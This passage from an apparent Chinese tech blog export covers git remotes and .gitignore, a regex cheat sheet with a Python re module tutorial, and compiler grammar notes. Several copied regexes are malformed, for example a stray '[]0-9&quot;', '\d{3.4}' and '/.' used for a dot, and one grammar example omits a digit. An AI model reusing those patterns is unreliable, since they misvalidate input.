git@github.com:onlynight/GitAdd.git (fetch)origin git@github.com:onlynight/GitAdd.git (push)$ git remote -vorigin git@github.com:onlynight/GitAdd.git (fetch)origin git@github.com:onlynight/GitAdd.git (push)origin2 git@github.com:onlnynight/GitAdd.git (fetch)origin2 git@github.com:onlnynight/GitAdd.git (push)$ git remote rm origin2$ git remote -vorigin git@github.com:onlynight/GitAdd.git (fetch)origin git@github.com:onlynight/GitAdd.git (push) 忽略特殊文件有些时候，你必须把某些文件放到Git工作目录中，但又不能提交它们，比如保存了数据库密码的配置文件啦，等等，每次git status都会显示Untracked files ...，有强迫症的童鞋心里肯定不爽。 好在Git考虑到了大家的感受，这个问题解决起来也很简单，在Git工作区的根目录下创建一个特殊的.gitignore文件，然后把要忽略的文件名填进去，Git就会自动忽略这些文件。 不需要从头写.gitignore文件，GitHub已经为我们准备了各种配置文件，只需要组合一下就可以使用了。所有配置文件可以直接在线浏览：https://github.com/github/gitignore 忽略文件的原则是： 忽略操作系统自动生成的文件，比如缩略图等； 忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如Java编译产生的.class文件； 忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。 举个例子： 假设你在Windows下进行Python开发，Windows会自动在有图片的目录下生成隐藏的缩略图文件，如果有自定义目录，目录下就会有Desktop.ini文件，因此你需要忽略Windows自动生成的垃圾文件： 1234567891011121314# Windows:Thumbs.dbehthumbs.dbDesktop.ini# Python:*.py[cod]*.so*.egg*.egg-infodistbuild# My configurations:db.inideploy_key_rsa 最后一步就是把.gitignore也提交到Git，就完成了！当然检验.gitignore的标准是git status命令是不是说working directory clean。 使用Windows的童鞋注意了，如果你在资源管理器里新建一个.gitignore文件，它会非常弱智地提示你必须输入文件名，但是在文本编辑器里“保存”或者“另存为”就可以把文件保存为.gitignore了。 有些时候，你想添加一个文件到Git，但发现添加不了，原因是这个文件被.gitignore忽略了： 1234$ git add App.classThe following paths are ignored by one of your .gitignore files:App.classUse -f if you really want to add them. 如果你确实想添加该文件，可以用-f强制添加到Git： 1$ git add -f App.class 或者你发现，可能是.gitignore写得有问题，需要找出来到底哪个规则写错了，可以用git check-ignore命令检查： 12$ git check-ignore -v App.class.gitignore:3:*.class App.class Git会告诉我们，.gitignore的第3行规则忽略了该文件，于是我们就可以知道应该修订哪个规则。 后续：搭建git服务器]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Regular Expression]]></title>
    <url>%2F2019%2F09%2F22%2Fre%2F</url>
    <content type="text"><![CDATA[正则表达式的规则常用元字符 代码 说明 . 匹配除换行符以外的任意字符 \w 匹配字母或数字或下划线 \s 匹配任意的空白符 \d 匹配数字 \b 匹配单词的开始或结束 ^ 匹配字符串的开始 $ 匹配字符串的结束 常用限定符 代码/语法 说明 * 重复零次或更多次 + 重复一次或更多次 ? 重复零次或一次 {n} 重复n次 {n,} 重复n次或更多次 {n,m} 重复n到m次 常用反义词 代码/语法 说明 \W 匹配任意不是字母，数字，下划线，汉字的字符 \S 匹配任意不是空白符的字符 \D 匹配任意非数字的字符 \B 匹配不是单词开头或结束的位置 [^x] 匹配除了x以外的任意字符 [^aeiou] 匹配除了aeiou这几个字母以外的任意字符 预定义字符集表 \d \d匹配任何十进制数，它相当于类[0-9]，\d+如果需要匹配一位或者多位数的数字时用 \D \D匹配任何非数字字符，它相当于类[^0-9] \s \s匹配任何空白字符，它相当于类[\t\n\r\f\v] \S \S匹配任何非空白字符，它相当于类[^\t\n\r\f\v] \w \w匹配包括下划线在内任何字母数字字符，它相当于类 {a-z,A-Z,0-9,_} \W \W匹配非任何字母数字字符包括下划线在内，它相当于类 { ^a-z,A-Z,0-9,_} \A 仅匹配字符串开头,同^ \Z 仅匹配字符串结尾，同$ \b b匹配一个单词边界，也就是指单词和空格间的位置 \B [^\b] 常用正则表达式 引用：史上最全常用正则表达式大全 一、校验数字的表达式 数字：^[0-9]*$ n位的数字：^\d{n}$ 至少n位的数字：^\d{n,}$ m-n位的数字：^\d{m,n}$ 零和非零开头的数字：^(0|[1-9][0-9]*)$ 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$ 带1-2位小数的正数或负数：^(\-)?\d+(\.\d{1,2})?$ 正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$ 有两位小数的正实数：^[0-9]+(.[0-9]{2})?$ 有1~3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$ 非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$ 非零的负整数：^\-[1-9][]0-9&quot;*$ 或 ^-[1-9]\d*$ 非负整数：^\d+$ 或 ^[1-9]\d*|0$ 非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$ 非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$ 非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$ 正浮点数：^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 负浮点数：^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$ 浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$ 二、校验字符的表达式 汉字：^[\u4e00-\u9fa5]{0,}$ 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$ 长度为3-20的所有字符：^.{3,20}$ 由26个英文字母组成的字符串：^[A-Za-z]+$ 由26个大写英文字母组成的字符串：^[A-Z]+$ 由26个小写英文字母组成的字符串：^[a-z]+$ 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$ 由数字、26个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w{3,20}$ 中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0-9_]+$ 中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0-9]+$或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$ 可以输入含有^%&amp;’,;=?$\”等字符：[^%&amp;&#39;,;=?$\x22]+ 12 禁止输入含有~的字符：[^~\x22]+ 三、特殊需求表达式 Email地址：^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$ 域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.? InternetURL：[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$ 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$ 电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX)：^(\(\d{3,4}-)|\d{3.4}-)?\d{7,8}$ 国内电话号码(0511-4405222、021-87888822)：\d{3}-\d{8}|\d{4}-\d{7} 身份证号(15位、18位数字)：^\d{15}|\d{18}$ 短身份证号码(数字、字母x结尾)：^([0-9]){7,18}(x|X)?$或^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$ 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w{5,17}$ 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)： ^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$ 日期格式：^\d{4}-\d{1,2}-\d{1,2} 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$ 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$ 钱的输入格式： 有四种钱的表示形式我们可以接受:”10000.00” 和 “10,000.00”, 和没有 “分” 的 “10000” 和 “10,000”：^[1-9][0-9]*$ 这表示任意一个不以0开头的数字,但是,这也意味着一个字符”0”不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$ 一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$ 这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 必须说明的是,小数点后面至少应该有1位数,所以”10.”是不通过的,但是 “10” 和 “10.2” 是通过的：^[0-9]+(.[0-9]{2})?$ 这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]{1,2})?$ 这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样： ^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$ 到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须： ^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$ 备注：这就是最终结果了,别忘了”+”可以用”*”替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里 xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$ 中文字符的正则表达式：[\u4e00-\u9fa5] 双字节字符：[^\x00-\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)) 空白行的正则表达式：\n\s*\r(可以用来删除空白行)* HTML标记的正则表达式：&lt;(\S*?)[^&gt;]*&gt;.*?&lt;/\1&gt;|&lt;.*? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力) 首尾空白字符的正则表达式：^\s*|\s*$或 (^\s*)|(\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式) 腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始) 中国邮政编码：[1-9]\d{5}(?!\d) (中国邮政编码为6位数字) IP地址：\d+\.\d+\.\d+\.\d+ (提取IP地址时有用) IP地址：((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)) Python re模块人生苦短，不如Python。 引用：python基础—re模块—正则表达式 python从1.5版本起增加re模块为自带的模块，提供了Perl风格的正则表达式模式 以下是python re库的常用函数 函数 描述 compile(pattern[, flags]) 根据包含正则表达式的字符串创建模式对象 search(pattern, string[, flags]) 在字符串中查找模式 match(pattern, string[, flags]) 在字符串开头匹配模式 split(pattern, string[, maxsplit=0]) 根据模式来分割字符串 findall(pattern, string) 返回一个列表，其中包含字符串中所有与模式匹配的子串 sub(pat, repl, string[, count=0]) 将字符串中与模式pat匹配的子串都替换为repl escape(string) 对字符串中所有的正则表达式特殊字符都进行转义 re.compile() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。语法格式为：re.compile(pattern[, flags])实例&gt;&gt;&gt;import re&gt;&gt;&gt; pattern = re.compile(r'\d+') # 用于匹配至少一个数字&gt;&gt;&gt; m = pattern.match('one12twothree34four') # 查找头部，没有匹配&gt;&gt;&gt; print(m)None&gt;&gt;&gt; m = pattern.match('one12twothree34four', 2, 10) # 从'e'的位置开始匹配，没有匹配&gt;&gt;&gt; print(m)None&gt;&gt;&gt; m = pattern.match('one12twothree34four', 3, 10) # 从'1'的位置开始匹配，正好匹配 &gt;&gt;&gt;print(m) # 返回一个 Match 对象&lt;_sre.SRE_Match object at 0x10a42aac0&gt;&gt;&gt;&gt; m.group(0) # 可省略 0 '12'&gt;&gt;&gt; m.start(0) # 可省略 0 3&gt;&gt;&gt; m.end(0) # 可省略 0 5&gt;&gt;&gt; m.span(0) # 可省略 0 (3, 5)在上面，当匹配成功时返回一个 Match 对象，其中：group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)；start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0；end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0；span([group]) 方法返回 (start(group), end(group))。再看看一个例子：实例&gt;&gt;&gt;import re&gt;&gt;&gt; pattern = re.compile(r'([a-z]+) ([a-z]+)', re.I) # re.I 表示忽略大小写&gt;&gt;&gt; m = pattern.match('Hello World Wide Web')&gt;&gt;&gt; print(m)# 匹配成功，返回一个 Match 对象&lt;_sre.SRE_Match object at 0x10bea83e8&gt;&gt;&gt;&gt; m.group(0) # 返回匹配成功的整个子串 'Hello World'&gt;&gt;&gt; m.span(0) # 返回匹配成功的整个子串的索引 (0, 11)&gt;&gt;&gt; m.group(1) # 返回第一个分组匹配成功的子串 'Hello'&gt;&gt;&gt; m.span(1) # 返回第一个分组匹配成功的子串的索引 (0, 5)&gt;&gt;&gt; m.group(2) # 返回第二个分组匹配成功的子串 'World'&gt;&gt;&gt; m.span(2) # 返回第二个分组匹配成功的子串 (6, 11)&gt;&gt;&gt; m.groups() # 等价于 (m.group(1), m.group(2), ...) ('Hello', 'World')&gt;&gt;&gt; m.group(3) # 不存在第三个分组Traceback (most recent call last):File "&lt;stdin&gt;", line 1, in &lt;module&gt;IndexError: no such group re.search()&amp;re.match() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117re.search 扫描整个字符串并返回第一个成功的匹配。函数语法：re.search(pattern, string, flags=0)函数参数说明：pattern:匹配的正则表达式string:要匹配的字符串。flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 匹配成功re.search方法返回一个匹配的对象，否则返回None。我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。匹配对象方法group(num=0):匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。groups():返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。实例import reline = "Cats are smarter than dogs";searchObj = re.search( r'(.*) are (.*?) .*', line, re.M|re.I)if searchObj: print ("searchObj.group() : ", searchObj.group()) print ("searchObj.group(1) : ", searchObj.group(1)) print ("searchObj.group(2) : ", searchObj.group(2))else: print( "Nothing found!!")以上实例执行结果如下：searchObj.group() : Cats are smarter than dogssearchObj.group(1) : CatssearchObj.group(2) : smarter _____________________________________________________________________________re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。函数语法：re.match(pattern, string, flags=0)函数参数说明：（同re.search一样）匹配成功re.match方法返回一个匹配的对象，否则返回None。我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。匹配对象方法：（同re.search一样）实例import reprint(re.match('www', 'www.runoob.com').span()) # 在起始位置匹配print(re.match('com', 'www.runoob.com')) # 不在起始位置匹配以上实例运行输出结果为：(0, 3) None实例import reline = "Cats are smarter than dogs"matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I)if matchObj: print("matchObj.group() : ", matchObj.group()) print("matchObj.group(1) : ", matchObj.group(1)) print("matchObj.group(2) : ", matchObj.group(2))else: print("No match!!")以上实例执行结果如下：matchObj.group() : Cats are smarter than dogsmatchObj.group(1) : CatsmatchObj.group(2) : smarter ____________________________________________________________________________re.match与re.search的区别:re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。实例import reline = "Cats are smarter than dogs";matchObj = re.match( r'dogs', line, re.M|re.I)if matchObj: print("match --&gt; matchObj.group() : ", matchObj.group())else: print ("No match!!")matchObj = re.search( r'dogs', line, re.M|re.I)if matchObj: print("search --&gt; matchObj.group() : ", matchObj.group())else: print("No match!!")以上实例运行结果如下：No match!!search --&gt; matchObj.group() : dogs re.split() 12345678910111213141516171819202122232425split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：re.split(pattern, string[, maxsplit=0, flags=0])参数:pattern:匹配的正则表达式string:要匹配的字符串。maxsplit:分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。实例&gt;&gt;&gt;import re&gt;&gt;&gt; re.split('\W+', 'runoob, runoob, runoob.')['runoob', 'runoob', 'runoob', '']&gt;&gt;&gt; re.split('(\W+)', ' runoob, runoob, runoob.')['', ' ', 'runoob', ', ', 'runoob', ', ', 'runoob', '.', '']&gt;&gt;&gt; re.split('\W+', ' runoob, runoob, runoob.', 1)['', 'runoob, runoob, runoob.']&gt;&gt;&gt; re.split('a*', 'hello world') # 对于一个找不到匹配的字符串而言，split 不会对其作出分割['hello world'] re.sub() 123456789101112131415161718192021222324252627282930313233343536373839404142Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。语法:re.sub(pattern, repl, string, count=0, flags=0)参数：pattern : 正则中的模式字符串。repl : 替换的字符串，也可为一个函数。string : 要被查找替换的原始字符串。count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。 实例:import rephone = "2004-959-559 # 这是一个国外电话号码"num = re.sub(r'#.*$', "", phone) # 删除字符串中的 Python注释print ("电话号码是: ", num)num = re.sub(r'\D', "", phone) # 删除非数字(-)的字符串print ("电话号码是 : ", num)以上实例执行结果如下：电话号码是: 2004-959-559电话号码是 : 2004959559 以下实例中将字符串中的匹配的数字乘以 2：import redef double(matched): # 将匹配的数字乘以 2 value = int(matched.group('value')) return str(value * 2)s = 'A23G4HFD567'print(re.sub('(?P&lt;value&gt;\d+)', double, s))执行输出结果为：A46G8HFD1134 findall() 1234567891011121314151617181920212223242526在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。注意： match 和 search 是匹配一次,findall 匹配所有。语法格式为：findall(string[, pos[, endpos]])参数：string: 待匹配的字符串。pos: 可选参数，指定字符串的起始位置，默认为 0。endpos: 可选参数，指定字符串的结束位置，默认为字符串的长度。查找字符串中的所有数字：实例import repattern = re.compile(r'\d+') # 查找数字result1 = pattern.findall('runoob 123 google 456')result2 = pattern.findall('run88oob123google456', 0, 10) #取字符串之中0-10之间的数字出来print(result1，result2)输出结果：['123', '456']，['88', '12'] re.finditer() 1234567891011121314151617181920和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。re.finditer(pattern, string, flags=0)参数:pattern:匹配的正则表达式string:要匹配的字符串。flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。实例import reit = re.finditer(r"\d+","12a32bc43jf3")for match in it: print (match.group() )输出结果：12 32 43 3 re.escape() re.escape()的主要作用就是将一个字符串变成可以匹配的正则表达式 12345re.escape是一个工具函数，用于对字符串中所有可能被视为正则表达式运算符的字符进行转义。使用这个函数的情况有：字符串很长，其中包含大量特殊字符，而你不想输入大量的反斜杠；你从用户那里获取了一个字符串（例如，通过函数input），想将其用于正则表达式中。下面的示例说明了这个函数的工作原理：&gt;&gt;&gt; re.escape('www.python.org') 'www\\.python\\.org' &gt;&gt;&gt; re.escape('But where is the ambiguity?') 'But\\ where\\ is\\ the\\ ambiuity\\?']]></content>
      <categories>
        <category>re</category>
      </categories>
      <tags>
        <tag>Re</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Compiler]]></title>
    <url>%2F2019%2F09%2F04%2FCompiler%2F</url>
    <content type="text"><![CDATA[一、引论编译原理是良好的数学基础和好的工程结构功能的结合。 Compiler：编译，述而不作，忠于编写的东西 编译器从逻辑上可以分成若干阶段，每个阶段把源程序从一种表示变换成另一种表示 1.1什么叫编译程序翻译器（翻译程序）：Translater 能将一种语言程序（源语言程序）转换成另一种等价的语言程序（目标语言程序） 编译器（编译程序）：Compiler 能将一种计算机高级语言程序（源语言程序）转换成另一种等价的计算机低级语言程序（目标语言程序） 解释器（解释程序）：Interpreter 也是一种翻译程序，以一种语言写的源程序作为输入，但不产生目标代码，而是边解释边执行 解释器和编译器的区别： ①编译分成两步完成：先翻译，在运行 ②解释只用一步就完成：边解释边执行 可变目标编译程序（Retargetable Compiler） 交叉编译程序（Cross Compiler） 1.2编译程序的组成 词法分析器：读入组成源程序的字符流，并将它们组织成为有意义的词素的序列 语法分析器：使用由词法分析器生成的各个词法单元的第一个分量来创建树形的中间表示，该中间表示给出了词法分析产生的词法单元流的语法结构。一个常用的表示方法便是语法树，树中的每个内部节点表示一个运算 语义分析器：使用语法树和符号表中的信息来检查源程序是否和语言定义的语义一致。同时也收集类型信息，并把这些信息存放在语法树或符号表中，以便在随后的中键代码生成过程中使用。 中间代码生成器：在把一个源程序翻译成目标代码的过程中，一个编译器可能构造出一个或多个中间表示。这些中间表示可以有多种形式。比如语法树是一种中间表示形式，通常在语法分析和语义分析中使用。 代码优化器：机器无关的代码优化步骤试图改进中间代码，以便生成更好的目标代码 代码生成器：代码生成器以源程序的中间表示形式作为输入，并把它映射到目标语言。 符号表管理器：记录源程序中使用的变量的名字，并收集和每个名字的各种属性有关的信息。 Tips: 如何学习构造编译程序 （1）源语言，对被编译的源程序深刻理解其结构和含义 （2）目标语言，假定目标语言是机器语言，就必须搞清楚硬件的系统结构和操作系统的功能 （3）编译方法，把一种语言翻译成另一种语言的方法很多，重点 二、高级语言及其语法描述2.1程序语言的语法和语义2.1.1语法任何语言均可作一个集合。这个集合中的每个元素都是在一定符号集（字母表）上的一个符号串。 对于自然语言来说，他们是定义在某个字母表上的句子的集合 对于程序语言来说，他们也是定义在某个字母表上的句子的集合。这里的句子，就是一个源程序。 词法规则：单词符号是语言中具有独立意义的最基本单位。语言的单词符号是由词法规则所确定的，即词法规则规定了单词符号的形成规则。 语法规则：上下文无关文法或BNF（Backus-Naur范式） 2.1.2语义语义，定义程序的意义 没有公认的形式系统描述语义 2.2程序语言的一般特征高级语言的分类 强制性语言（Imperative Language）|过程式语言：Fortran，C，Pascal 应用式语言（Applicative Language）|函数式语言：LISP 基于规则的语言（Ruled-based Language）：Prolog 面向对象语言（Object-oriented Language）：JAVA，c++ 2.3程序语言的语法描述一、字母表和符号串 字母表：符号的非空有限集合 例：∑ ={a，b，c} 符号：字母表中的元素 例： a，b，c 符号串：符号的有穷序列 例：a, aa, ac, abc，.. 空符号串：无任何符号的符号串( ε ) 符号串集合：由符号串构成的集合。 符号串的形式定义 有字母表∑，定义： （1）ε是∑上的符号串； （2）若x是∑上的符号串，且a∈ ∑，则ax或xa是 ∑ 上的符号串； （3）y是∑上的符号串，iff（当且仅当）y可由（1）和（2）产生。 二、符号串和符号串集合的运算符号串相等：若x、y是集合上的两个符号串，则x＝y，iff（当且仅当）组成x的每一个符号和组成y的每一个符号依次相等。 符号串的长度：若x为符号串，其长度|x|等于组成该符 号串的符号个数。（例：x＝STV， |x|=3） 符号串的连接：若x、y是定义在Σ是上的符号串，且x＝XY，y＝YX，则x和y的连接 xy ＝ XYYX也是Σ上的符号串。（注意：一般xy ≠ yx，但是εx = xε） 符号串集合的乘积运算：令A、B为符号串集合，定义AB＝{ xy | x∈A, y∈B} 符号串集合的幂运算：有符号串集合A，定义A0 ={ε}, A1=A, A2=AA, A3=AAA,…… ……, An＝An-1A=AAn-1 ，n&gt;0 符号串集合的闭包运算：设A是符号串集合，定义 A＋＝ A1 ∪ A2 ∪ A3 ∪……∪ An ∪…… 称为集合A的正则闭包。A*＝ A0 ∪A＋ 称为集合A的闭包。（A0 = { ε } ） 为什么对符号、符号串、符号串集合以及它们的运算感兴趣？ 若A为某语言的基本字符集 ​ A＝{a,b,……z,0,1,……,9, +,－,×,_/, ( , ), =……} B为单词集 ​ B ={begin, end, if, then,else,for,……,&lt;标识符&gt;,&lt;常量&gt;,……} 则B ⊂ A* 。 语言的句子是定义在B上的符号串。 若令C为句子集合，则C ⊂ B* , 程序 ⊂ C 三、文法的直观理解1.什么是文法：文法是对语言结构的定义与描述。即从形式上用于描述和规定语言结构的称为“文法”（或称为“语法”）。 2.语法规则：我们通过建立一组规则（产生式），来描述句子的语法结构。规定用“::=”表示“由……组成“。 例如： &lt;句子&gt;::=&lt;主语&gt;&lt;谓语&gt; &lt;主语&gt;::=&lt;代词&gt;|&lt;名词&gt; &lt;代词&gt; ::=你|我|他 &lt;名词&gt;::= 王民|大学生|工人|英语 &lt;谓语&gt;::=&lt;动词&gt;&lt;直接宾语&gt; &lt;动词&gt;::=是|学习 &lt;直接宾语&gt;::=&lt;代词&gt;|&lt;名词&gt; 3.由产生式推导句子：3.有了一组产生式之后，可以按照一定的方式用它们去推导或产生句子。 ​ 推导方法：从一个要识别的符号开始推导，即用相应产生式的右部来替代产生式的左部，每次仅用一条产生式去进行推导。 &lt;句子&gt; =&gt; &lt;主语&gt;&lt;谓语&gt; &lt;主语&gt;&lt;谓语&gt; =&gt; &lt;代词&gt;&lt;谓语&gt; …… …… 这种推导一直进行下去，直到所有带&lt; &gt;的符号都由终结符号替代为止。 说明：有若干语法成分同时存在时，我们总是从最左的语法成分进行推导，这称之为最左推导，类似的有最右推导（一般推导）。 文法实在形式上对句子结构的定义与描述，而未涉及语义问题 4.语法树 一般用语法树来描述一个句子的语法结构。 四、文法和语言的形式定义1.文法的定义定义1: 文法 G =（VN，VT，P，Z） ​ VN ： 非终结符号集​ VT ： 终结符号集​ P： 产生式或规则的集合​ Z： 开始符号（识别符号） Z∈VN 产生式：产生式是一个有序对(U, x), 通常写为: ​ U ::= x 或U ➡ x； |U| = 1 |x| &gt;= 0 非终结符号：出现在产生式的左部,且能推出符号或符号串的那些符号。其全体构成非终结符号集，记为VN 终结符号：不出现在产生式的左部,且不能推出符号或符号串的那些符号。其全体构成终结符号集，记为VT 12345678910无符号整数的文法:G[&lt;无符号整数&gt;]=（VN，VT，P，Z）4VN＝&#123;&lt;无符号整数&gt;, &lt;数字串&gt;, &lt;数字&gt;&#125;4VT = &#123;0,1,2,3,4,5,6,7,8,9&#125;4P = &#123;&lt;无符号整数&gt; → &lt;数字串&gt; ; &lt;数字串&gt; → &lt;数字串&gt; &lt;数字&gt; ; &lt;数字串&gt; → &lt;数字&gt; ; &lt;数字&gt; →0; &lt;数字&gt; →2; &lt;数字&gt; →3; &lt;数字&gt; →4; &lt;数字&gt; →5; &lt;数字&gt; →6; &lt;数字&gt; →7; &lt;数字&gt; →8; &lt;数字&gt; →9; &#125;4Z = &lt;无符号整数&gt;; 注：产生式左边符合构成集合VN，且Z ∈ VN ​ 有些产生式有相同的左部，可以合在一起 ​ 给定一个文法，实际上只需给出产生式的集合，并指定识别符号（开始符号） 2.推导与归约定义2：直接推导： 有文法G：v = xUy，w = xuy，其中x、y∈V*，U∈VN，u∈V*， 若U ::= u∈P，则v &rArr; w， 若 x = y = ε ， 有 U ::= u， 则U &rArr; u x和y是符号串，若使用一次产生式可以从x变换出y，则称x直接推导出y(或者说y是x的直接推导），记为x&rArr;y。 定义3： +推导：x和y是符号串，若使用若干次产生式可以从x变换出y，则称x推导出y(或者说y是x的推导），记为x =+=&rArr;y。 即，若有直接推导序列：x=U0==&gt;U1==&gt;U2==&gt;……==&gt;Un=y,则 x=+=&gt;y 。 定义4：*推导：x和y是符号串，若使用0次或若干次产生式可以从x变换出y，则称x推导出y(或者说y是x的推导），记为x=*=&gt;y。 如：N=*=&gt;N， N=*=&gt;109 定义5：最右推导&amp;最左推导 最右推导：若符号串α中有两个以上的非终结符时，对推导的每一步坚持把α中的最右非终结符进行替换，称为最右推导。 最左推导：若符号串α中有两个以上的非终结符时，对推导的每一步坚持把α中的最左非终结符进行替换，称为最左推导。 ！！！规范推导＝最右推导 定义6：推导的逆过程为归约 x==&gt;y，可称为x直接推导出y，也可称为y直接归约出x 3.语言的形式定义定义7：文法G[Z] ​ （1）句型：x是句型 &hArr; Z =*=&gt;x,且 x∈V*； ​ （2）句子：x是句子 &hArr; Z =+=&gt; x, 且 x∈VT*； ​ （3）语言：L（G[Z]）={x| Z=+=&gt;x， x∈VT* }；（文法G[z]产生的所有句子的集合） 定义8：G和G’是两个不同的文法，若L(G) = L(G’)，则G和G’为等价文法 编译感兴趣的问题如下 给定终极符x，文法G，求x ∈ L(G)？ 4.文法分类 形式语言：用文法和自动机所描述的没有语义的语言 语言定义： L(G[Z]) = { x | Z=+=&gt;x，x∈VT* } 文法定义：乔姆斯基将所有文法定义为一个四元组：G = （VN，VT，P，Z） VN ： 非终结符号集VT ： 终结符号集P： 产生式或规则的集合Z： 开始符号（识别符号） Z∈VN 文法和语言的分类：0型、1型、2型、3型 定义9： 0型文法 P： u &rarr; v ，其中 u ∈ V+，v ∈ V* 0型文法称为短语结构文法。产生式的左部和右部都可以是符号串，一个短语可以产生另一个短语。 0型语言：L0，这种语言可以用图灵机（Turing）接受 定义10：1型文法 P： xUy &rarr; xuy ，其中 U ∈VN，x、y、u ∈ V* 1型文法称为上下文有关或上下文敏感。即只有在x、y这样的上下文中才能将U改写为u 1型语言：L1，这种语言可以有一种线性界限自动机接受 定义11：2型文法 P： U &rarr; u ，其中 U ∈ VN ，u ∈ V* 